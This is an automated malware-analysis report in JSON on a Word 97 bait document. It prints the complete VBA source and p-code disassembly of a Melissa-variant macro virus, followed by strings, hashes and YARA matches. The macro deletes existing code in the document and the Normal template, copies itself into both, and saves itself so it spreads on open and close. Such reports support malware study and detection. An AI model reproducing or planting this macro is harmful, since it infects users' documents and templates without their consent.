{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AddFromString": "May attempt to modify the VBA code",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Close": "Runs when the Word document is closed",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "Private Sub Document_Open()\nSet ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)\nSet NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)\nNTCL = NTI1.CodeModule.CountOfLines\nADCL = ADI1.CodeModule.CountOfLines\nBGN = 2\nIf ADI1.Name <> \"Melissa\" Then\nIf ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL\nSet ToInfect = ADI1\nADI1.Name = \"Melissa\"\nDoAD = True\nEnd If\nIf NTI1.Name <> \"Melissa\" Then\nIf NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL\nSet ToInfect = NTI1\nNTI1.Name = \"Melissa\"\nDoNT = True\nEnd If\nIf DoNT <> True And DoAD <> True Then GoTo CYA\nIf DoNT = True Then\nDo While ADI1.CodeModule.Lines(1, 1) = \"\"\nADI1.CodeModule.DeleteLines 1\nLoop\nToInfect.CodeModule.AddFromString (\"Private Sub Document_Close()\")\nDo While ADI1.CodeModule.Lines(BGN, 1) <> \"\"\nToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)\nBGN = BGN + 1\nLoop\nEnd If\nIf DoAD = True Then\nDo While NTI1.CodeModule.Lines(1, 1) = \"\"\nNTI1.CodeModule.DeleteLines 1\nLoop\nToInfect.CodeModule.AddFromString (\"Private Sub Document_Open()\")\nDo While NTI1.CodeModule.Lines(BGN, 1) <> \"\"\nToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)\nBGN = BGN + 1\nLoop\nEnd If\nCYA:\nIf NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, \"Document\") = False) Then\nActiveDocument.SaveAs FileName:=ActiveDocument.FullName\nElseIf (InStr(1, ActiveDocument.Name, \"Document\") <> False) Then\nActiveDocument.Saved = True: End If\n''Works in both Word 2000 and Word 97\n''Word -> Email | Word 97 <--> Word 2000 ... it's a new age!\nIf Day(Now) = Minute(Now) Then Selection.TypeText \" Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here.\"\nEnd Sub\n\n\n' Processing file: VirusShare_22d9248399e99c098c20aa0b07c43659\n' ===============================================================================\n' Module streams:\n' Macros/VBA/Melissa - 3652 bytes\n' Line #0:\n' \tFuncDefn (Private Sub Document_Open())\n' Line #1:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet ADI1 \n' Line #2:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet NTI1 \n' Line #3:\n' \tLd NTI1 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tSt NTCL \n' Line #4:\n' \tLd ADI1 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tSt ADCL \n' Line #5:\n' \tLitDI2 0x0002 \n' \tSt BGN \n' Line #6:\n' \tLd ADI1 \n' \tMemLd New \n' \tLitStr 0x0007 \"Melissa\"\n' \tNe \n' \tIfBlock \n' Line #7:\n' \tLineCont 0x0004 05 00 00 00\n' \tLd ADCL \n' \tLitDI2 0x0000 \n' \tGt \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0001 \n' \tLd ADCL \n' \tLd ADI1 \n' \tMemLd CodeModule \n' \tArgsMemCall DeleteLines 0x0002 \n' \tEndIf \n' Line #8:\n' \tSetStmt \n' \tLd ADI1 \n' \tSet ToInfect \n' Line #9:\n' \tLitStr 0x0007 \"Melissa\"\n' \tLd ADI1 \n' \tMemSt New \n' Line #10:\n' \tLitVarSpecial (True)\n' \tSt DoAD \n' Line #11:\n' \tEndIfBlock \n' Line #12:\n' \tLd NTI1 \n' \tMemLd New \n' \tLitStr 0x0007 \"Melissa\"\n' \tNe \n' \tIfBlock \n' Line #13:\n' \tLineCont 0x0004 05 00 00 00\n' \tLd NTCL \n' \tLitDI2 0x0000 \n' \tGt \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0001 \n' \tLd NTCL \n' \tLd NTI1 \n' \tMemLd CodeModule \n' \tArgsMemCall DeleteLines 0x0002 \n' \tEndIf \n' Line #14:\n' \tSetStmt \n' \tLd NTI1 \n' \tSet ToInfect \n' Line #15:\n' \tLitStr 0x0007 \"Melissa\"\n' \tLd NTI1 \n' \tMemSt New \n' Line #16:\n' \tLitVarSpecial (True)\n' \tSt DoNT \n' Line #17:\n' \tEndIfBlock \n' Line #18:\n' \tLd DoNT \n' \tLitVarSpecial (True)\n' \tNe \n' \tLd DoAD \n' \tLitVarSpecial (True)\n' \tNe \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tGoTo CYA \n' \tEndIf \n' Line #19:\n' \tLd DoNT \n' \tLitVarSpecial (True)\n' \tEq \n' \tIfBlock \n' Line #20:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd ADI1 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tDoWhile \n' Line #21:\n' \tLitDI2 0x0001 \n' \tLd ADI1 \n' \tMemLd CodeModule \n' \tArgsMemCall DeleteLines 0x0001 \n' Line #22:\n' \tLoop \n' Line #23:\n' \tLitStr 0x001C \"Private Sub Document_Close()\"\n' \tParen \n' \tLd ToInfect \n' \tMemLd CodeModule \n' \tArgsMemCall AddFromString 0x0001 \n' Line #24:\n' \tLd BGN \n' \tLitDI2 0x0001 \n' \tLd ADI1 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tDoWhile \n' Line #25:\n' \tLd BGN \n' \tLd BGN \n' \tLitDI2 0x0001 \n' \tLd ADI1 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLd ToInfect \n' \tMemLd CodeModule \n' \tArgsMemCall InsertLines 0x0002 \n' Line #26:\n' \tLd BGN \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt BGN \n' Line #27:\n' \tLoop \n' Line #28:\n' \tEndIfBlock \n' Line #29:\n' \tLd DoAD \n' \tLitVarSpecial (True)\n' \tEq \n' \tIfBlock \n' Line #30:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd NTI1 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tDoWhile \n' Line #31:\n' \tLitDI2 0x0001 \n' \tLd NTI1 \n' \tMemLd CodeModule \n' \tArgsMemCall DeleteLines 0x0001 \n' Line #32:\n' \tLoop \n' Line #33:\n' \tLitStr 0x001B \"Private Sub Document_Open()\"\n' \tParen \n' \tLd ToInfect \n' \tMemLd CodeModule \n' \tArgsMemCall AddFromString 0x0001 \n' Line #34:\n' \tLd BGN \n' \tLitDI2 0x0001 \n' \tLd NTI1 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tDoWhile \n' Line #35:\n' \tLd BGN \n' \tLd BGN \n' \tLitDI2 0x0001 \n' \tLd NTI1 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLd ToInfect \n' \tMemLd CodeModule \n' \tArgsMemCall InsertLines 0x0002 \n' Line #36:\n' \tLd BGN \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt BGN \n' Line #37:\n' \tLoop \n' Line #38:\n' \tEndIfBlock \n' Line #39:\n' \tLabel CYA \n' Line #40:\n' \tLd NTCL \n' \tLitDI2 0x0000 \n' \tNe \n' \tLd ADCL \n' \tLitDI2 0x0000 \n' \tEq \n' \tAnd \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd New \n' \tLitStr 0x0008 \"Document\"\n' \tFnInStr3 \n' \tLitVarSpecial (False)\n' \tEq \n' \tParen \n' \tAnd \n' \tIfBlock \n' Line #41:\n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' Line #42:\n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd New \n' \tLitStr 0x0008 \"Document\"\n' \tFnInStr3 \n' \tLitVarSpecial (False)\n' \tNe \n' \tParen \n' \tElseIfBlock \n' Line #43:\n' \tLitVarSpecial (True)\n' \tLd ActiveDocument \n' \tMemSt Saved \n' \tBoS 0x0000 \n' \tEndIfBlock \n' Line #44:\n' \tQuoteRem 0x0000 0x0024 \"'Works in both Word 2000 and Word 97\"\n' Line #45:\n' \tQuoteRem 0x0000 0x003B \"'Word -> Email | Word 97 <--> Word 2000 ... it's a new age!\"\n' Line #46:\n' \tLd Now \n' \tArgsLd Day 0x0001 \n' \tLd Now \n' \tArgsLd Minute 0x0001 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0076 \" Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here.\"\n' \tLd Selection \n' \tArgsMemCall TypeText 0x0001 \n' \tEndIf \n' Line #47:\n' \tEndSub \n' Line #48:\n"
    },
    "filename": "VirusShare_22d9248399e99c098c20aa0b07c43659",
    "filesize": 29184,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Title: Virus Infected Bait File, Author: Joe Hartmann, Template: Normal.dot, Last Saved By: rar, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Sat Jan 29 17:04:00 2000, Last Saved Time/Date: Sat Jan 29 17:04:00 2000, Number of Pages: 1, Number of Words: 8, Number of Characters: 47, Security: 4",
    "hashes": {
        "md5": "22d9248399e99c098c20aa0b07c43659",
        "sha1": "7cfe0fb517beb6a3a5275017e32668dea13dd86d",
        "sha256": "4968a2cac22f9759954202526ca07f7687cc58ab499f2688857186ba9aad5197"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj",
            "]\tzj",
            "ROSE_SWE",
            "$PEZiALBAiTF0R-black-21.07.2001",
            "  532534D2 This is a small sample! VS740A~1.DOC",
            "$PEZiAL_BAiT_F0R_-_Szule/Positron_szulevs@matavnet.hu_-_21.07.2001",
            "  510ADE94 VS740A~1.DOC",
            ". A!",
            "@HP LaserJet IIIP",
            "FILE:",
            "HPPCL5MS",
            "HP LaserJet IIIP",
            "HP LaserJet IIIP",
            "MSUDN",
            "HP LaserJet IIIP",
            "HP LaserJet IIIP",
            "MSUDN",
            "HP LaserJet IIIP",
            "Virus Infected Bait File",
            "Joe Hartmann",
            "Normal.dot",
            "Microsoft Word 8.0",
            "Virus Infected Bait File",
            "Virus Infected Bait File",
            "Titel",
            "Title",
            "_PID_GUID",
            "]\tzj",
            "]\tzj",
            "]\tzj",
            "]\tzj",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "c2.tlb#O",
            "LE Autom`ation",
            "mMSForms",
            "42EDA80-",
            "F26D-11D@0-A00F",
            "0CC249C5",
            "3.TWD#",
            "Microsof",
            "` Ob",
            " Library",
            "P68527",
            "6C3-81A8",
            "P0EB13",
            "PJP\\VBE\\\t(EX(.E",
            "CxN@UTalCxNTax",
            " +\t,C",
            "icDO@f",
            "{2DF8D04",
            "C-5BFA-1",
            "01B-BDE5S",
            "FFICE97\\",
            "ENGLISH\\`WORD\\C",
            "@O97.DLL",
            "iC!P 8.0Ri",
            "e@lissa",
            "\u0118eAis",
            "0046",
            "mon  ",
            "Melissa",
            "Melissa",
            "Melissa",
            "Melissa",
            "Private Sub Document_Close()",
            "Private Sub Document_Open()",
            "Document~",
            "Document~",
            "'Works in both Word 2000 and Word 97",
            "'Word -> Email | Word 97 <--> Word 2000 ... it's a new age!",
            " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here. ",
            "Attribut",
            "e VB_Nam",
            "e = \"Melissa\"",
            "x1Nor",
            "mal.",
            "Cre atabl",
            "Predecla",
            "\"Expo",
            "Templ",
            "ateDeriv",
            "$Customi6z",
            "ub Docum",
            "ent_Open",
            "Set ",
            "ADI1HAct",
            ".VBPro",
            "ject",
            "s.Item(1",
            "NTCL7",
            ".CodeMo",
            "dule",
            "untOfLines",
            "Ifb.",
            " Then#",
            "(> 0",
            " _\tA",
            "DeleDte",
            "CLGToInf",
            "DoAD",
            "C]End IfB",
            ":X&CI&MFL&",
            "Q&NT9Q&Do",
            "K, A",
            "N GoT`o CYAB2",
            "VDo Wh.i@",
            "jQ(Q1)",
            "\"A\u0540[",
            "L`oop",
            "AddFromS ng (\"",
            "Clq()\"@$",
            "InsxertCA",
            "+ 1E",
            "(@(C",
            "\"6`&-",
            "&&:\t&`N:g",
            "0\"TA\u3083",
            "(InBLA`, \"j\"aPF)/",
            "SaveAs F Y\tA",
            "Full",
            "e: F'",
            "'Works in both ",
            "d 2000 aCt",
            " -> Emai",
            "97 <",
            "... i",
            "t's a ne@w age!#za y(Now#Minn ",
            "n.TypeText \" Tw",
            "y-two po",
            "ints, pl",
            "us sple-",
            "word-sco",
            "fifty",
            " for us",
            "ixall my",
            "  ters. ",
            "over",
            "I'm out",
            "ta here.",
            "#Sub",
            "6380f97ce",
            "Wordk",
            "Win16~",
            "Win32",
            "HAVS1B",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "MelissaQ",
            "Documentj",
            "Document_Open",
            "ADI1",
            "ActiveDocument\\",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "NTI1W",
            "NormalTemplateq",
            "NTCLV",
            "CodeModule",
            "CountOfLines!\\",
            "ADCL",
            "BGNx",
            "DeleteLines",
            "ToInfect",
            "DoAD(",
            "DoNT",
            "Lines",
            "AddFromString",
            "InsertLines",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "Savedd",
            "Now%",
            "Minuteam",
            "SelectionZ",
            "TypeText",
            "ID=\"{B06CA80E-87CE-11D3-A00F-00105A780227}\"",
            "Document=Melissa/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"B7B51A7D26834187418741874187\"",
            "DPB=\"D6D47B9E85A2A5A3A5A3A5\"",
            "GC=\"F5F758BB68DB69DB6924\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "Melissa=0, 0, 0, 0, C",
            "Melissa",
            "Microsoft Word-Dokument",
            "MSWo",
            "rdDoc",
            "Word.Document.8"
        ],
        "file": {
            "  510ADE94 VS740A~1.DOC": "Word",
            "  532534D2 This is a small sample! VS740A~1.DOC": "Word",
            "@O97.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.296284",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
